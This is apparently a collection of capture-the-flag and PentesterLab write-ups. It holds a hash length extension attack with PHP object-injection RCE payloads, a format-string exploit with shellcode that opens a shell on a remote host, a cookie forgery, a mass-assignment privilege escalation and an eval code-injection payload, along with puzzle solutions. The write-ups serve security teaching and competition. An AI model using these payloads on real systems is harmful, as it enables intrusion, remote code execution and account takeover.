'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A10%3A%22system%28ls%29%22%3B%7D%7D%7D'

# Post object with complex filter (system ls /home/daedalus)
command = "system('ls /home/daedalus')"
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:"+str(len(command))+":\""+command+"\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'7ece8c86d7c432f420f51c276cce9eebcf47d92b'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A27%3A%22system%28%27ls+%2Fhome%2Fdaedalus%27%29%22%3B%7D%7D%7D'


###
<?php
  define('STEVES_LIST_ABSOLUTE_INCLUDE_ROOT', dirname(__FILE__) . "/");
  define('STEVES_LIST_TEMPLATES_PATH', dirname(__FILE__) . "/templates/");
  define('DISPLAY_POSTS', 0);
  // Daedalus changed this... I guess AAAAAAAA was not a good secret :(
  define('AUTH_SECRET', "\xb9\xffCV\xa2v\xe9\xa1");
  require_once(STEVES_LIST_ABSOLUTE_INCLUDE_ROOT . "includes/classes.php");
?>
###

Made a little script that automates the sending of commands:

import send_command
s = send_command.send
print s("system('cat /home/daedalus/flag.txt')")
print s("system('cat /var/www/html/cookies.php')")



FLAG: D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve



Note: replaced ' by \' in add

#####

# References:
- hash length extension attack
- hashpump/hashpumpy
- [PHP preg_replace vulnerability](http://www.madirish.net/402)
- http://php.net/manual/en/reference.pcre.pattern.syntax.php


### File: writeups/picoctf_2014/steves_list/hlextend-master/README.md

hlextend
========

Pure Python Hash Length Extension module.

Currently supports SHA1, SHA256 and SHA512, more algorithms will
be added in the future.


Create a hash by calling one of the named constuctor functions:
sha1(), sha256(), and sha512(), or by calling new(algorithm).

The hash objects have the following methods:

	hash(message):      

	    Feeds data into the hash function using the normal interface.

	extend(appendData, knownData, secretLength, startHash, raw=False):

	    Performs a hash length extension attack.  Returns the string to
	    use when appending data.

	hexdigest():        

	    Returns a hexlified version of the hash output.


Assume you have a hash generated from an unknown secret value concatenated with
a known value, and you want to be able to produce a valid hash after appending 
additional data to the known value.

If the hash algorithm used is one of the vulnerable functions implemented in
this module, is is possible to achieve this without knowing the secret value
as long as you know (or can guess, perhaps by brute force) the length of that
secret value.  This is called a hash length extension attack. 


Given an existing sha1 hash value '52e98441017043eee154a6d1af98c5e0efab055c',
known data of 'hello', an unknown secret of length 10 and data you wish
to append of 'file', you would do the following to perform the attack:

	>>> import hlextend
	>>> sha = hlextend.new('sha1')
	>>> print sha.extend('file', 'hello', 10, '52e98441017043eee154a6d1af98c5e0efab055c')
	'hello\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
	\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
	\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xfile'
	>>> print sha.hexdigest()
	c60fa7de0860d4048a3bfb36b70299a95e6587c9


The unknown secret (of length 10), that when hashed appended with 'hello' produces
a SHA1 hash of '52e98441017043eee154a6d1af98c5e0efab055c', will then produce 
a SHA1 hash of 'c60fa7de0860d4048a3bfb36b70299a95e6587c9' when appended with the output 
from the extend function above.

If you are not sure of the exact length of the secret value, simply try the above
multiple times specifying different values for the length to brute force.



### File: writeups/plaidctf_2015/ebp/README.md

**Name**: EBP  
**Points**: 160  
***Type**: Pwnable  
**Description**:  
nc 52.6.64.173 4545  
Download: [%p%o%o%p](http://play.plaidctf.com/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf).  
**Hints**: (none)  
**Files**: http://play.plaidctf.com/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf  
**CTF**: PlaidCTF 2015

#####

Right off the bat, we can see that this binary does nothing more than just echo back whatever you input. The first thing that comes to mind is "format string vulnerablity", and sure enough:
```
$ ./ebp
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
f76a2ada.f77a2440.0804a080.ffa1fe38.0804852c.00000001.00000000.0804a080.f77a1ff4.00000000.00000000.ffa1fe58.08048557.0804a080.00000400.f77a2440.f77a1ff4.08048580.00000000.ffa1fed8.f7658e46.00000001.ffa1ff04.ffa1ff0c.f77cb860.f77e4821.ffffffff.f77ecff4.080482b1.00000001.

```

Normally, we would now load up our exploit string, look for it on the stack, and use that to easily achieve arbitrary write. We do this by repeating "%08x." and look for stack values that contain "\x\x\x\x\x". Unfortunately, in this case (as we can see above), our string is not be placed on the stack, so we'll have to use another way of achieving our goal (which is to overwrite the return address of the function that calls the format string function).

In order to write where we want to write, we have to first get the target address somewhere on the stack. Then we can write to that address with the "%n" modifier.

Let's load up the binary in gdb and find the call to the format string function:
```
# gdb ebp -q
(gdb) disas main
Dump of assembler code for function main:
   0x08048547 <+0>: push   ebp
   0x08048548 <+1>: mov    ebp,esp
   0x0804854a <+3>: and    esp,0xfffffff0
   0x0804854d <+6>: sub    esp,0x10
   0x08048550 <+9>: jmp    0x8048557 <main+16>
   0x08048552 <+11>:    call   0x8048521 <echo>
   0x08048557 <+16>:    mov    eax,ds:0x804a040
   0x0804855c <+21>:    mov    DWORD PTR [esp+0x8],eax
   0x08048560 <+25>:    mov    DWORD PTR [esp+0x4],0x400
   0x08048568 <+33>:    mov    DWORD PTR [esp],0x804a080
   0x0804856f <+40>:    call   0x80483b0 <fgets@plt>
   0x08048574 <+45>:    test   eax,eax
   0x08048576 <+47>:    jne    0x8048552 <main+11>
   0x08048578 <+49>:    leave  
   0x08048579 <+50>:    ret    
End of assembler dump.
(gdb) disas echo
Dump of assembler code for function echo:
   0x08048521 <+0>: push   ebp
   0x08048522 <+1>: mov    ebp,esp
   0x08048524 <+3>: sub    esp,0x18
   0x08048527 <+6>: call   0x80484fd <make_response>
   0x0804852c <+11>:    mov    DWORD PTR [esp],0x804a480
   0x08048533 <+18>:    call   0x80483c0 <puts@plt>
   0x08048538 <+23>:    mov    eax,ds:0x804a060
   0x0804853d <+28>:    mov    DWORD PTR [esp],eax
   0x08048540 <+31>:    call   0x80483a0 <fflush@plt>
   0x08048545 <+36>:    leave  
   0x08048546 <+37>:    ret    
End of assembler dump.
(gdb) disas make_response
Dump of assembler code for function make_response:
   0x080484fd <+0>: push   ebp
   0x080484fe <+1>: mov    ebp,esp
   0x08048500 <+3>: sub    esp,0x18
   0x08048503 <+6>: mov    DWORD PTR [esp+0x8],0x804a080
   0x0804850b <+14>:    mov    DWORD PTR [esp+0x4],0x400
   0x08048513 <+22>:    mov    DWORD PTR [esp],0x804a480
   0x0804851a <+29>:    call   0x80483f0 <snprintf@plt>
   0x0804851f <+34>:    leave  
   0x08048520 <+35>:    ret    
```

The call is made from the function `make_response`, at address `0x0804851a`. We can set a breakpoint there are have a look at the stack before the call:
```
(gdb) break *0x0804851a
(gdb) run
test
Breakpoint 1, 0x0804851a in make_response ()
(gdb) x/32xw $esp
0xffffd440: 0x0804a480  0x00000400  0x0804a080  0xf7eb2ada
0xffffd450: 0xf7fb2440  0x0804a080  0xffffd478  0x0804852c
0xffffd460: 0x00000001  0x00000000  0x0804a080  0xf7fb1ff4
0xffffd470: 0x00000000  0x00000000  0xffffd498  0x08048557
0xffffd480: 0x0804a080  0x00000400  0xf7fb2440  0xf7fb1ff4
0xffffd490: 0x08048580  0x00000000  0xffffd518  0xf7e68e46
0xffffd4a0: 0x00000001  0xffffd544  0xffffd54c  0xf7fdb860
0xffffd4b0: 0xf7ff4821  0xffffffff  0xf7ffcff4  0x080482b1
```

We can see a couple of interesting things here:
- if we compare the values from gdb and those from simply executing the binary, we see different values. This indicates that ASLR is active, so that each execution, the addresses will be different. Thye might still be related though.
- `0x0804a080` occurs in both executions in the same spot. GDB tells us this is the address of the buffer that holds our format string. This is useful, because we can use this to store our shellcode and jump to the fixed address.
- `0x0804852c` also occurs in both executions. This is the return address of the function `make_response`; this is what we want to overwrite. It's at address `0xffffd45c` in GDB, but will change in actual execution.

# Step 1: Setting up the target address
Our first step is to get the target address on the stack. We can see some addresses that resemble the target address in GDB, but nothing that points exactly where we need it. Because we get to input multiple strings, we can just use a specially crafted format string to put the address we want on the stack, and deal with overwriting the target address later (see step 2). 

We are looking for a value on the stack that points to another value on the stack, that is close to our target address. I chose value `0xffffd478` at address `0xffffd458`, which would be the 4th format string argument. If we dereference that value, we see `0xffffd498` (close to our target address of `0xffffd45c`). Let's see if we can use that to write something to the stack (stack view is shown after call to format string function):
```
(gdb) run
%x%x%x%n
Breakpoint 1, 0x0804851a in make_response ()
(gdb) ni
(gdb) x/32xw $esp
0xffffd440: 0x0804a480  0x00000400  0x0804a080  0xf7eb2ada
0xffffd450: 0xf7fb2440  0x0804852c  0xffffd478  0x0804852c
0xffffd460: 0x00000001  0x00000000  0x0804a080  0xf7fb1ff4
0xffffd470: 0x00000000  0x00000000  0x00000017  0x08048557
0xffffd480: 0x0804a080  0x00000400  0xf7fb2440  0xf7fb1ff4
0xffffd490: 0x08048580  0x00000000  0xffffd518  0xf7e68e46
0xffffd4a0: 0x00000001  0xffffd544  0xffffd54c  0xf7fdb860
0xffffd4b0: 0xf7ff4821  0xffffffff  0xf7ffcff4  0x080482b1
```
Success, we have overwritten the value at `0xffffd47` with the value `0x17`. This is the first step of the puzzle. In the actual exploit, we'll refrain from overwriting the entire value, and just overwrite the least significant byte(s), using a format string length modifier: "h" overwrites 2 bytes, "hh" overwrites 1 byte. 

Ok, so we know how to overwrite that value; now we need to know what to overwrite it with (remember, ASLR means we can't rely on any addresses we get from GDB). The adresses of the stack might change, but they are still maintain the same relative distance to each other. The values `0xffffd478` and `0xffffd498` (from GDB) have the same difference as the values `0xffa1fe38`and `0xffa1fe58` (from normal execution above). This means we can calculate the target address from the values we see. In GDB, our chosen values is `0xffffd478` and the target address is `0xffffd45c`. If we can read that value during normal execution, we can get the target address by subtracting `0x1c` from it.

Finally, the format string to overwrite the last byte with an arbitrary value (let's say "ab") is: `%0171x%4$hhn`. The first part prints 171 (= `0xab`) characters to stdout, increasing the bytes written so far. The second part skips to the 4th argument ("4$") and overwrites the last byte ("hh") with the number of bytes written so far ("%n").  
Example:
```
$ ./ebp
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f7677ada.f7777440.0804a080.ffb35238.0804852c.00000001.00000000.0804a080.f7776ff4.00000000.00000000.ffb35258

%0171x%4$hhn
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f7677ada

%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f7677ada.f7777440.0804a080.ffb35238.0804852c.00000001.00000000.0804a080.f7776ff4.00000000.00000000.ffb352ab
```
The value that used to be `0xffb35258` is now `0xffb352ab`.

# Step 2: Overwriting the target address
The second part is using the address we put on the stack (at the 12th argument) to overwrite the target value. It currently holds the return address `0x0804852c`, but we want to point in to our buffer `0x0804a080`. Again, there's no need to overwrite the entire value, we just need to change the last 2 bytes. While we are overwriting this, we also have to include shellcode in the buffer. Luckily, this time we won't have to calculate any addresses, because the buffer address is constant. We can do a test run (without shellcode), but if we overwrite the return address, we'll need a core dump to verify if we've overwritten it correctly:
```
$ ulimit -c unlimited
$ ./ebp
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f76afada.f77af440.0804a080.ffc93e98.0804852c.00000001.00000000.0804a080.f77aeff4.00000000.00000000.ffc93eb8

%0124x%4$hhn
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f76afada

%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f76afada.f77af440.0804a080.ffc93e98.0804852c.00000001.00000000.0804a080.f77aeff4.00000000.00000000.ffc93e7c

%041088x%12$hn
Segmentation fault (core dumped)
$ gdb -q ebp core
Program terminated with signal 11, Segmentation fault.
#0  0x0804a085 in buf ()
(gdb) x/x 0xffc93e7c
0xffc93e7c: 0x0804a080
```
We read out the value `0xffc93e98` and subtract `0x1c`. The target address should be `0xffc93e7c`. We only need to overwrite the last byte `0x7c` (= 124). We want to change the last 2 bytes of the return address to `0xa080` (= 41088). After the 4th input, we predictably get a SEGFAULT. We check with GDB and our overwrite was successful.

# Step 3: Executing the exploit

The final difficulty is that on the one hand we need interactivity (because of ASLR) and on the other hand we need to be able to send over our shellcode. We can't just use netcat and we can't know the traget address, so sending all the info at once is also not possible. The solution is using *named pipes*, which are like files you can write to that input data to any program that's reading them. They can be created with the `mkfifo` command. Normally these pipes are closed after they've been written to, but there's a trick to keep them open and write to them repeatedly. After you're done using them, execute `ps aux | grep pipe` to find and kill any processes still keeping your pipe open:
##### Terminal 1
```
$ mkfifo pipe
$ cat > pipe &
$ cat pipe | ./ebp
test1

test2

```
##### Terminal 2
```
$ echo "test1" > pipe
$ echo "test2" > pipe
```

Shellcode:
`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

Now that everything's in order, let's get our flag:
##### Terminal 1
```
$ cat pipe | nc 52.6.64.173 4545
0000000a.00000001.f77b1000.ffd00e48.0804852c.ffd00e68.f77d4020.ffd00e94.f77b1000.00000000.00000000.ffd00e68.

0000000000000000000000000000000000000000000a

0000000a.00000001.00000000.ffd00e48.0804852c.f77b1ac0.f77d4020.ffd00e94.f77b1000.00000000.00000000.ffd00e2c.

problem

ebp
flag.txt

who_needs_stack_control_anyway?

```
##### Terminal 2
```
$ python -c 'print "%08x."*12' > pipe
$ python -c 'print "%044x%4$hhn"' > pipe
$ python -c 'print "%08x."*12' > pipe
$ python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"%041067x%12$hn"' > pipe
$ echo "whoami" > pipe
$ echo "ls /home/problem" > pipe
$ echo "cat /home/problem/flag.txt" > pipe

```
Just clarifying some details: we see the valuè0xffd00e48`, so after subtracting`0x1c`, we get target address ̀0xffd00e2c`. We'll need 44 (= `0x2c`) bytes in the first part of the first write. The second write value is the same as during step 2, but we also have to remember to account for our shellcode which is 21 bytes (we wrote 41088 bytes in step 2, so 41088-21 = 41067). Once we get a shell, we need to find the flag, but the user's home directory is usually a good place to start.

FLAG = who_needs_stack_control_anyway?


### File: writeups/plaidctf_2015/qttpd/README.md

 Pwnable (950 pts)

There are 3 (three) flags to be had at http://107.189.94.25 ... good luck!

Part 1 (200 pts)
No solvers yet. 

Part 2 (450 pts)
No solvers yet.

Part 3 (300 pts)
No solvers yet.


### File: writeups/plaidctf_2015/strength/README.md

1) obvious case of encrypting with same modulus
2) we can break this if we find 2 exponents that are coprime (gcd == 1)
    --> use script
3) 1804229351 and 17249876309 are coprime (0x6b8a5ae7 and 0x4042c3955):

{0xa5f7f8aaa82921f70aad9ece4eb77b62112f51ac2be75910b3137a28d22d7ef3be3d734dabb9d853221f1a17b1afb956a50236a7e858569cdfec3edf350e1f88ad13c1efdd1e98b151ce2a207e5d8b6ab31c2b66e6114b1d5384c5fa0aad92cc079965d4127339847477877d0a057335e2a761562d2d56f1bebb21374b729743L : 0x6b8a5ae7 : 0x6fdcbfb5cd2cacd032ef7200fd49b9f304a6dbd8399f4a91a72d1d9150f97b3b513f44dfc56f6f7c8ec41a8ef9b93a80230a1e65e29d2ef519bb83931d4b0c7a589059cfdf2d571660ab790a9c7e085e3018bf19748abd6d521952b68bc9594c1ad34726658bd9bd445d3b6381ceee57328838e8a129867e505be0ca0d1a1da5L}

{0xa5f7f8aaa82921f70aad9ece4eb77b62112f51ac2be75910b3137a28d22d7ef3be3d734dabb9d853221f1a17b1afb956a50236a7e858569cdfec3edf350e1f88ad13c1efdd1e98b151ce2a207e5d8b6ab31c2b66e6114b1d5384c5fa0aad92cc079965d4127339847477877d0a057335e2a761562d2d56f1bebb21374b729743L : 0x4042c3955 : 0x8caeaa7d272f9606fee9222efd1d922143db738b95bd64746b27bc4c0fd979a2c57b4735131a4391a81bf5f0c0c8eea41d4f91bed4d17784b1956fd89882b97c98009051ac3a03964499c864524d3ddc10299c0290e91707b62ce89b118afe558151be39d61de0483def52c6cb546132ecab85143715bc593a2892b1e41b37b9L}

flag_Strength_Lies_In_Differences


### File: writeups/plaidctf_2015/unknown/README.md

https://www.cs.cmu.edu/~AUIS/



### File: writeups/volgactf_2015/homework/README.md

Use Gimp:
- free select tool to put each piece in its own layer
- rotate all layers
- puzzle layers
- fine-tune puzzle
- decolorize
- contrast max + appropriate lighting
- manually retouch borders
- export to png (see qrc3.png)
- upload to http://blog.qr4.nl/Online-QR-Code_Decoder.aspx (or use QR code lib)

Message:
It was night, in the lonesome October
Of my most immemorial year:
It was hard by the dim lake of Auber,
In the misty mid region of Weir-
It was down by the dank tarn of Auber,
In the ghoul-haunted woodland of Weir.

Here once, through an alley Titanic,
Of cypress, I roamed with my Soul-
flag is:
of_cypress_with_psyche_my_soul


### File: writeups/volgactf_2015/relax_&_enjoy/README.md

0.44: Venucia
1.22: Vignale
2.23: Wiesmann
3.19: Yugo / Zastava Koral
3.51: ZAZ
4.32: Zbrojovka Brno
4.48: Velie

venuciavignalewiesmanzastavakoralzazzbrojovkabrnovelie
venuciavignalewiesmanyugozazzbrojovkabrnovelie
venuciavignalewiesmanyugozazzbrojovkavelie
venuciavignalewiesmanyugozazzetovelie


### File: writeups/volgactf_2015/world_art/joy200/README.md

1. New York, USA
Craig Rd N, Governor Island
https://www.google.be/maps/@40.68821,-74.024117,3a,46.6y,311.74h,87.31t/data=!3m5!1e1!3m3!1sa8x7qpGP2aanOpAp0bNlGQ!2e0!3e5

2. Paris, FR
Marché Neuf St, Ile-de-France
https://www.google.be/maps/@48.853645,2.346874,3a,75y,130.18h,90.87t/data=!3m4!1e1!3m2!1sqP3eUf1n9NMrOhhkDRUJYw!2e0

3. Allianz arena
Werner-Heisenberg Allee, Munich, Bavaria
https://www.google.be/maps/@48.221306,11.62596,3a,75y,194.16h,90.44t/data=!3m4!1e1!3m2!1sRV3fE4k5sFDwGcWW4ZhqEg!2e0!6m1!1e1

4. Burj AL Arab, Dubai
Al Sufouh Rd
https://www.google.be/maps/@25.127294,55.183429,3a,75y,338.04h,93.19t/data=!3m4!1e1!3m2!1spya2qvZc_hLRwyb5fxjkgg!2e0

5. Rome, IT
Via Nicola Salvi
https://www.google.be/maps/@41.891437,12.491944,3a,75y,242.96h,87.54t/data=!3m4!1e1!3m2!1sNhQZU3SB67KmjUwrsMEPPw!2e0!6m1!1e1

6. Barcelona, ES
Carrer de Sicilia / Plaça de la Sagrada Familia
https://www.google.be/maps/@41.402666,2.17204,3a,75y,71.42h,86.36t/data=!3m4!1e1!3m2!1sBA2_MGdw2wpJwS3TTGv3cg!2e0

7. Rio de Janeiro, BR
7945 Estr. Redentor
https://www.google.be/maps/place/Estr.+Redentor,+7945+-+Alto+da+Boa+Vista,+Parque+Nacional+da+Tijuca+-+Rio+de+Janeiro+-+RJ,+Brazil/@-22.947837,-43.217981,3a,75y,127.29h,86.83t/data=!3m4!1e1!3m2!1sNbYnq3rAFdDvs2WkzL-QEg!2e0!4m2!3m1!1s0x997e2bd510a8d9:0x66f186c785ec593a!6m1!1e1

8. Sydney, AU
Hickson Rd
https://www.google.be/maps/@-33.854982,151.210067,3a,75y,90.76h,87.02t/data=!3m4!1e1!3m2!1s3InbTPhHUmMNsv-iKhWWPg!2e0

9. space shuttle monument RU?
Malomoskovskaya ul.
Маломосковская ул.
Samara, Samara Oblast
https://www.google.be/maps/@53.211299,50.177127,3a,75y,320.87h,81.92t/data=!3m4!1e1!3m2!1sNnlCfHZhgYFkb_bb9azQiA!2e0

one wrong: crmawealnicarehima

cr - Craig Rd. N
ma - Marché Neuf St.
we - Werner-Heisenberg Av.
al - Al Sufouh Rd.
ni - Via Nicola Salvi
si - Carrer de Sicilia
re - Estr. Redentor
hi - Hickson Rd.
ma - Malomoskovskaya ul.

crmawealnisirehima


### File: writeups/PentesterLab Pro/Essential Badge/AUTHE_01.md

**Description:**  
In this exercise, you can log in as ``user1``. Your goal is to get logged in as ```admin```. To do so, you need to carefully look at the response sent back by the server.  
You can see that when you log in as ```user1```, you get a cookie named ```user1```. From that you can easily modify this value (using a proxy or a browser's extension) to get logged in as ```admin```.

---

The solution is relatively trivial after seeing the cookie that is set after registering/logging in:
```
Set-Cookie: auth=delilled
```
Obviously, intercepting the request to edit this value or changing the cookie using the browser allows you to log in using any account. Change the cookie value to ```admin``` and collect the flag.



### File: writeups/PentesterLab Pro/Essential Badge/AUTHE_02.md

**Description:**  
This example is similar to the previous example. As soon as you receive a cookie from an application, it is always good to see what it looks like. Try to crack it using a password cracker or try to just Google it. From that you should be able to generate a valid cookie for the user ```admin```.  
**General advice:**       
 If you get the same session ID many times when logging in: there is a problem! If you log in from a clean browser, you should never get the same cookies twice.  

---
Again, we look at the cookie value that is set after logging in (username = ```delilled```):
```
Set-Cookie: auth=32ac4ff6ff36d07da4427a06856e18bb
```
Two things come to mind: hex encoding and hashing. Using CyberChef, it's easy to rule out simple hex encoding because we get the nonsense ```2¬Oöÿ6Ð}¤Bz..n.»```. 

From the challenge description, we can expect a simple hashing algorithm; the most obvious of which is md5. This guess turns out to be correct; the tool hash-identifier (included in Kali) could also be used to find out which hashing algorithms output a value of this length. Using CyberChef again, we confirm that ```delilled``` md5-hashes to ```32ac4ff6ff36d07da4427a06856e18bb```.

Hash ```admin``` and set this value (```21232f297a57a5a743894a0e4a801fc3```) as the auth cookie to be logged in as admin.



### File: writeups/PentesterLab Pro/Essential Badge/AUTHE_03.md

**Description:**  
This example shows the consequence of different method of string comparison. When you create a user, the application will check programmatically that the user does not exist by comparing the username provided with the existing user. When you log in, the application will check that your username and password are correct, and then it will save your username in your session. Finally, every time you will access the application, the application will retrieve your user's details based on the username provided in the session.

The trick here comes from the fact that the comparison when you create a user is done programmatically (i.e.: in Ruby) but when the user's details get retrieved, the comparison is done by the database. By default, MySQL (with the type ```VARCHAR```) will perform a case insensitive comparison: "admin" and "Admin" are the same value.

Using that information, you should be able to create a user that will be identified as ```admin```. 

---
The challenge description is a bit too spoilery for me. Just register an account that uses different case (like ```ADmin```) to get the flag.



### File: writeups/PentesterLab Pro/Essential Badge/AUTHE_04.md

**Description:**     
To remediate the previous issue, the developer decided to use a case sensitive comparison during users' creation. This check can also be bypassed based on the way MySQL performs string comparison: MySQL ignores trailing spaces (i.e.: ```pentesterlab``` and ```pentesterlab[space]``` are equals). Using the same method as above, you should be able to pretend to be logged in as the user ```admin```.

**General advice:**  
A good way to prevent this issue is to tell the database that the username is a PRIMARY KEY. This method is, for example, used in Tomcat documentation to use a SQL backend as a Realm. 

---

Again, too spoilery. Register a username with trailing spaces (```admin[space][space]```) to get the flag.



### File: writeups/PentesterLab Pro/Essential Badge/AUTHO_01.md

Forceful browsing:
```
http://<ID>.libcurl.so/infos/3
```



### File: writeups/PentesterLab Pro/Essential Badge/AUTHO_02.md

Note: These challenges are too easy to waste time doing a full write-up. Going forward, I'll just include the answer in the shortest possible way.

---
Browse to ```http://<subdomain>.libcurl.so/infos/3/edit```.



### File: writeups/PentesterLab Pro/Essential Badge/AUTHO_03.md

Change the ```Accept``` header in the request to JSON:
```
Accept: application/json
```



### File: writeups/PentesterLab Pro/Essential Badge/AUTHO_04.md

Add ```user[admin]=true``` to the POST parameters of the register request:
```
user%5Busername%5D=delilled2&user%5Bpassword%5D=test&user%5Badmin%5D=true&submit=Submit+Query
```



### File: writeups/PentesterLab Pro/Essential Badge/AUTHO_05.md

The bug was fixed for the register function, but not for the changing password function. 
As before, add ```user[admin]=true``` to the POST parameters of the passowrd change request:
```
user%5Busername%5D=test&user%5Bpassword%5D=test2&user%5Badmin%5D=true&submit=Submit+Query
```



### File: writeups/PentesterLab Pro/Essential Badge/AUTHO_06.md

Mass asignment in password change request:
```
user%5Busername%5D=test&user%5Bpassword%5D=test&user[organisation_id]=1&submit=Submit+Query
```



### File: writeups/PentesterLab Pro/Essential Badge/CODEXEC_01.md

The following parameter value allows RCE:  
```name=".system('<command>');//```

The vulnerable code is:
```
<?php 
  $str="echo \"Hello ".$_GET['name']."!!!\";";

  eval($str);
?>
```
You can get retrieve this using the URL ```view-source:http://<ID>.libcurl.so/?name=%22.system(%27cat%20index.php%27);//```.

Here we can see that any system commands will be executed twice; once as part of the assignent and once in eval. You can avoid this by adding ```die();``` before the slashes.

Not sure why anyone would do this; ```echo "Hello ".$_GET['name']."!!!";``` is much simpler (although this would be vulnerable to XSS)...

